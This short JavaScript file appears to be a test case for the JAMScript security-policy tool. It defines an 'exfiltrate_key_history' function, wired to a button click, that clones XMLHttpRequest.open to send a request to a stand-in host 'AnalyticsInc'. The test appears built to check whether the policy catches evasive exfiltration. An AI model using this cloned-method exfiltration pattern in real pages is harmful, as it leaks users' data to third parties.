
JAM.startProfile('load');
function exfiltrate_key_history(){var v0=xmlhttp=new XMLHttpRequest,v2=xmlhttp.open,v2=JAMScript.callIntrospect(v2.bind,v2,[xmlhttp],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);v0.opennew=v2;JAMScript.callIntrospect(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone2",!0],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);JAMScript.callIntrospect(xmlhttp.send,xmlhttp,[null],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)}
var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
